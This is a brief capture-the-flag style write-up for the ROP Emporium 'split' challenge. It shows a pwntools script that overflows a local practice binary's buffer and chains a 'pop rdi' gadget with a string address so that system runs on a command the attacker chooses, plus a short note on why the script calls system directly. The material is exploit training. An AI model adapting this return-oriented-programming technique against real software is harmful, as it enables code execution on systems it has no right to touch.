`script.py`: 

```python
from pwn import *

p = process('./split')

ret_gadget = p64(0x40053e)
rdi_gadget = p64(0x00000000004007c3)
useful_function = p64(0x400742)
useful_string_add = p64(0x601060)
system = p64(0x000000000040074b)

payload = b'A'*40 + rdi_gadget + useful_string_add + system

p.sendline(payload)
p.interactive()
```

here, we need to call the `system` function and not the `usefulFunction` in order to change the argument to the `system` function.

Passing in the address of `usefulFunction` and then changing its `rdi` register will run the same function with the argument `useful_string_add` which will just give us segmentation fault. 

